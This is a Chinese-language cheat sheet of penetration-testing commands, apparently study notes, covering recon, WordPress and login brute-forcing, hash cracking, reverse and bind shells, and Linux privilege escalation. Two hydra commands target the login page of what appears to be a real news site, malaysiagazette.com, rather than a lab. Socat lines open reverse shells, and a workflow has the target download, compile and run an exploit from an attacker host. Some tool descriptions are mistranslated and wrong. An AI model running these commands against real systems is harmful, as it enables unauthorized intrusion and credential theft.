# 常用渗透工具命令

## 信息收集

### 被动侦察

在被动侦察中，您依赖于公开可用的知识。您无需直接与目标接触即可从公开可用资源中获取这些知识。把它想象成你从远处看着目标领土，而不是踏上那个领土。

被动侦察活动包括许多活动，例如：

从公共 DNS 服务器查找域的 DNS 记录。
检查与目标网站相关的招聘广告。
阅读有关目标公司的新闻文章。

以下介绍三个命令行工具和两种在线服务：

whois 查询 WHOIS 服务器

语法 whois  domanin



nslookup  查询 WHOIS 服务器

语法：  nslookup OPTIONS DOMAIN_NAME SERVER

OPTIONS 包含查询类型，如下表所示。例如，您可以使用A  (IPv4地址)和AAAA(IPv6 地址)

DOMAIN_NAME 是您正在查找的域名。

SERVER 是您要查询的 DNS 服务器。您可以选择任何本地或公共 DNS 服务器进行查询。Cloudflare 提供1.1.1.1和1.0.0.1，Google 提供8.8.8.8和8.8.4.4，Quad9 提供9.9.9.9和149.112.112.112。如果您想要 ISP 的 DNS 服务器的替代方案，您可以选择更多的公共 DNS服务器。

nslookup -type=A tryhackme.com 1.1.1.1

nslookup -type=MX tryhackme.com





dig 查询 WHOIS 服务器

dig DOMAIN_NAME TYPE

dig @SERVER DOMAIN_NAME TYPE

SERVER 是您要查询的 DNS 服务器。
DOMAIN_NAME 是您正在查找的域名。

nmap扫出一堆服务，但不知道接下来需要做什么

DNSDumpster

Shodan.io

nmap服务版本不显示



### 主动侦察

#### 网页枚举

良好的枚举技能在渗透测试中至关重要——否则你怎么知道你的目标是什么？！然而，它很容易掉入兔子洞。 

#### 手动枚举

我们不需要从一开始就开始展开花哨的工具包。

使用我们的浏览器开发者控制台

包括 Chrome 和 Firefox 在内的现代浏览器在“开发者工具/控制台”中有一套工具。我们将讨论 Firefox 的，然而，Chrome 有一个非常相似的套件。该套件包括一系列工具，包括：

查看页面源代码
寻找资产
在客户端（我们的浏览器）调试和执行代码，例如 javascript
使用我们键盘上的“F12”，这是启动这套工具的快捷方式。 

开发人员经常以<!-- -->标签的形式留下评论

#### 枚举工具

##### Gobuster

Gobuster 是用 Go编写的。Go 是一种开源的低级语言（很像 C 或 Rust），由 Google 的团队和其他贡献者开发。

安装 sudo apt install gobuster

有用的全局标志

旗帜	 长旗	     描述
-t	--线程	      并发线程数（默认10）
-v	--冗长	      详细输出
-z	- 没有进展  不显示进度
-q	- 安静的	 不要打印横幅和其他噪音
-o	- 输出	     将结果写入的输出文件

我通常会将线程数更改为 64 以提高扫描速度。如果不更改线程数，Gobuster 可能会有点慢。

gobuster dir -w -u

gobuster dir -w -u  -x html,js,conf,txt.html -t 64 

扩展名搜索



gobuster dns  -d  domain-name   -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt





gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

--append-domain

 将 URL 的主域附加到词表中的词。否则，需要在词表中指定完全限定的域。



/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
/usr/share/wordlists/dirbuster/directory-list-1.0.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/small.txt
/usr/share/wordlists/dirb/extensions_common.txt - 在对文件进行模糊测试时很有用！

非标准列表   sudo apt install seclists   在github搜索也行

 

##### wpscan

安装wpscan

sudo apt update && sudo apt install wpscan 

在使用 WPScan 之前，强烈建议您在执行任何扫描之前更新此数据库。

wpscan --update



枚举已安装的主题（themes）

wpscan --url http://cmnatics.playground/ --enumerate t 



枚举已安装的插件(plugin)

wpscan --url http://cmnatics.playground/ --enumerate p



枚举用户(user)

wpscan --url http://cmnatics.playground/ --enumerate u 

执行密码攻击



枚举漏洞

wpscan --url http://cmnatics.playground/ --enumerate vp 



爆破密码

在确定 WordPress 安装上可能的用户名列表后，我们可以使用 WPScan 对我们指定的用户名和我们提供的密码列表执行暴力破解技术。简单地说，我们使用用户名枚举的输出来构建如下命令：

wpscan –-url http://cmnatics.playground –-passwords rockyou.txt –-usernames cmnatic



调整 WPScan 的攻击性 (WAF)





## 漏洞探测



### Nikto

Nikto 最初于 2001 年发布，多年来取得了突飞猛进的发展，并且由于其开源性质和丰富的功能，已被证明是一种非常受欢迎的漏洞扫描器。Nikto 能够对所有类型的网络服务器进行评估（并且不是特定于应用程序的，例如 WPScan。）。Nikto 可用于发现可能的漏洞，包括：

敏感文件



过时的服务器和程序（即易受攻击的网络服务器安装）
常见的服务器和软件错误配置（目录索引、cgi 脚本、x-ss 保护）

#### 安装 Nikto

sudo apt update && sudo apt install nikto



#### 基本扫描

nikto -h vulnerable_ip



##### 扫描多个主机和端口

nikto -h 10.10.10.1 -p 80,8000,8080



#### 插件介绍

插件进一步扩展了 Nikto 的功能。使用从我们的基本扫描中收集的信息，我们可以挑选适合我们目标的插件。您可以使用--list-plugins带有 Nikto 的标志来列出插件或以更易于在线阅读的格式查看整个列表。

一些有趣的插件包括：

apacheusers   

尝试枚举Apache HTTP 身份验证用户



cgi  

 寻找我们可以利用的 CGI 脚本



robots    

分析 robots.txt 文件，该文件指示我们能够导航到哪些文件/文件夹



dir_traversal 

尝试使用目录遍历攻击（即LFI）在Linux上寻找系统文件



我们可以通过使用-Plugin参数和我们希望使用的插件的名称来指定我们希望使用的插件...例如，要使用“ apacheuser ”插件，我们的 Nikto 扫描将如下所示：

nikto -h 10.10.10.1 -Plugin apacheuser



详细说明我们的扫描

我们可以通过为标志提供以下参数来增加 Nikto 扫描的冗长程度-Display。除非另有说明，否则 Nikto 给出的输出不是全部输出，因为它有时可能是无关紧要的（但情况并非总是如此！）













## XBruteForcer



perl XBruteForcer.pl -l list.txt -p passwords.txt



密码词典：10 million password list top



蛮力攻击线程再高也没用，目标网站响应速度不快





## hydra

暴力破解FTP

hydra -l user -P passlist.txt ftp://MACHINE_IP

暴力破解SSH

﻿hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

爆破web表单

hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V



./hydra -l admin -P ~/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt  malaysiagazette.com      http-post-form  "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username admin is incorrect." -V







./hydra -l admin -P ~/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt https-post-form://tribune.malaysiagazette.com/wp-login.php:"log=^USER^&pwd=^PASS^&wp-submit=Log+In":"Invalid username"

wordpress暴力破解成功性低



chrome 浏览器的开发人员控制台中怎么输入命令



## sqlmap







## John the Ripper(开膛手约翰)

安装与构建

1、用于git clone https://github.com/openwall/john -b bleeding-jumbo john将 jumbo john 存储库克隆到您当前的工作
2、然后cd john/src/将当前目录更改为源代码所在的目录。 
3、进入此目录后，使用./configure检查所需的依赖项和已配置的选项。
4、如果您对此输出感到满意，并且已经安装了所需的任何必需的依赖项，请使用make -s clean && make -sj4构建 john 的二进制文件。这个二进制文件将在上面的运行目录中，您可以更改为cd ../run
5、您可以使用 ./john --test 测试此二进制文件



kali  linux自带，可以用john或者/sbin/john启用

单词表/usr/share/wordlists/rockyou.txt



### 破解基本哈希

先用hash-id.py识别哈希类型

wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py

python3 hash-id.py  {hash value}

开膛手破解

john --format=[format] --wordlist=[path to wordlist] [path to file]

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt



### 破解windows哈希

windows hash format:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Administrator是用户名

500是相对标识符（500是管理员，502是kerberos帐户）

aad3b435b51404eeaad3b435b51404ee是 LM 哈希

1d6cfe0d16ae931b73c59d7e0c089c0是 NT 哈希





john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt



### 破解/etc/shawod哈希

unshadow [path to passwd] [path to shadow]

用法示例：

unshadow local_passwd local_shadow > unshadowed.txt

文件- local_passwd 内容

root:x：0:0::/root:/bin/bash

文件  local_shadow

root:$6$2nwjN454g.dv4HN/$m9Z/r2xVfweYVkrr.v5Ft8Ws3/YYksfNwq96UL1FX0OJjY1L6l.DS3KEVsZ9rOVLB/ldTeEL/OIhJZ4GMFMGA0:18576::::::

unshadow把两个文件合成新文件，然后开始破解

john --wordlist=/usr/share/wordlists/rockyou.txt   unshadowed.txt

#这里失败几次，echo shadow的内容进去不成功，只能vim编辑再复制。shadow文件没搞好，后面unshadowed文件也会出事的



### 使用单一破解模式

john --single --format=[format] [path to file]

 john--single --format=raw-sha256 hashes.txt

关于单破解模式下文件格式的说明：

如果您在单一破解模式下破解哈希，则需要更改您为 john 提供的文件格式，以便它了解从哪些数据创建单词列表。您可以通过在哈希之前添加哈希所属的用户名来执行此操作，因此根据上面的示例 - 我们将更改文件 hashes.txt

1efee03cdcb96d90ad48ccc7b8666033

mike：1efee03cdcb96d90ad48ccc7b8666033



https://temp.sh/  完美解决物理机和网页版沙箱机器的互传文件问题



### 破解受密码保护的 Zip 文件

内置Zip2John工具

用法示例

zip2john zipfile.zip > zip_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

unzip zipfile.zip

### 破解受密码保护的 RAR 档案

内置rar2john

rar2john rarfile.rar > rar_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

unrar  e  rarfile.rar

### 破解 SSH 密钥

不一定内置ssh2john，可以从python3 /opt/ssh2john.py或者python /usr/share/john/ssh2john.py调用

用法示例

ssh2john id_rsa > id_rsa_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt



## Shell连接与稳定性

### shell工具

#### netcat

netcat有对应的window版本。

反向shell

使用 Linux 启动 netcat 侦听器的语法如下：

nc -lvnp <port-number>  

-l用于告诉 netcat 这将是一个监听器
-v用于请求详细输出
-n告诉 netcat 不解析主机名或使用 DNS
-p表示将遵循端口规范。

可以使用任何您喜欢的端口，只要还没有服务使用它即可。请注意，如果您选择使用低于 1024 的端口，则需要sudo在启动侦听器时使用。也就是说，使用众所周知的端口号（80、443 或 53 是不错的选择）通常是个好主意，因为这更有可能通过目标上的出站防火墙规则。

示例：sudo nc -lvnp 443



绑定外壳

如果我们希望在目标上获得绑定 shell，那么我们可以假设已经有一个侦听器在目标的选定端口上等待我们：我们需要做的就是连接到它。其语法相对简单：

nc <target-ip> <chosen-port>

在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。

#### Socat

下面是 socat 中基本反向 shell 侦听器的语法：

socat TCP-L:<port> 等效于 nc -lvnp port



在 Windows 上，我们将使用此命令进行回连：

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes



这是 Linux 目标的等效命令：

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"



 socat 中基本绑定 shell 侦听器的语法：

在 Linux 目标上  socat TCP-L:<PORT> EXEC:"bash -li"

在 Windows 目标上    socat TCP-L:<PORT> EXEC:powershell.exe,pipes



无论目标是什么，我们都在我们的攻击机器上使用这个命令来连接到等待的监听器

socat TCP:<TARGET-IP>:<TARGET-PORT>



#### Metasploit—exploit/multi/handler

#### Msfvenom 

### shell类型

反向 shell是指目标被迫执行连接回您的计算机的代码。在您自己的计算机上，您将使用上一个任务中提到的工具之一来设置一个用于接收连接的侦听器。反向 shell 是绕过防火墙规则的好方法，防火墙规则可能会阻止您连接到目标上的任意端口；然而，缺点是，当通过 Internet 从一台机器接收 shell 时，您需要配置自己的网络以接受 shell。



绑定 shell是指在目标上执行的代码用于启动直接在目标上附加到 shell 的侦听器。然后这将向互联网开放，这意味着您可以连接到代码打开的端口并以这种方式获得远程代码执行。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。



作为一般规则，反向 shell 更容易执行和调试。

监听器在攻击机是反向shell，目标机连接回来。

监听器在目标机是绑定shell，攻击机要连过去。











## 权限提升

### Linux提权

已经获得了目标机器的入口，ssh访问。

在攻击机下载les（linux exploit suggester），并用python快速开启服务器

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

python -m http.server  port



在目标机那边下载并运行脚本

cd /tmp
wget http://my machine ip /les.sh
chmod 777 les.sh
./les.sh



分析脚本的漏洞建议，在攻击机下载漏洞并改名（漏洞怎么方式下载都行），在目标机接收并运行。

（假设此漏洞是cve-2015-1328，expdb上为37292）

攻击机

wget https://www.exploit-db.com/download/37292
mv 37292 exploit.c
ls -l exploit.c
python3.9 -m http.server 9999



目标机

wget http://192.168.0.13:9999/exploit.c

gcc exploit.c -o exploit
./exploit
whoami
hostname



## 

## web安全

### ssrf

#### 什么是 SSRF？

SSRF 代表服务器端请求伪造。这是一个允许恶意用户导致网络服务器向攻击者选择的资源发出附加或编辑的 HTTP 请求的漏洞。

##### SSRF 的类型

有两种类型的 SSRF 漏洞；第一个是常规的 SSRF，其中数据返回到攻击者的屏幕。第二种是盲目 SSRF 漏洞，发生 SSRF，但没有信息返回到攻击者的屏幕。

##### 有什么影响？

成功的 SSRF 攻击可能导致以下任何情况： 

进入未经授权的区域。
访问客户/组织数据。
能够扩展到内部网络。
显示身份验证令牌/凭证。

### ssrf一般会以什么样的形式出现

在地址栏的参数中使用完整 URL 时：

![image-20230403002112381](C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230403002112381.png)

表单中的隐藏字段：

![image-20230403002121242](C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230403002121242.png)

部分 URL，例如主机名：

![image-20230403002128414](C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230403002128414.png)

或者可能只是 URL 的路径：

![image-20230403002134355](C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230403002134355.png)

### ssrf一般在网络应用程序中会以什么形式出现

某些网站的图片调用功能

![image-20230403022733541](C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230403022733541.png)



hosts

## steghide 提取二进制图片数字



Steghide 有 2 个选项：-
--embed  嵌入（隐藏图像中的数据）
--extract 提取（从图像中提取数据）



-sf标志与提取选项一起使用，用于选择隐写文件

steghide  --extract -sf  二进制文件图片 binary.jpg



## 靶机本能习惯

兔子洞感觉还是有必要的，兔子洞代表着实际渗透中经过侦察后才知道没有价值的一些文件。

nmap一扫出来samba服务就要马上想到用 smbclient -L去看看共享文件夹里面的东西，不管是不是兔子洞。

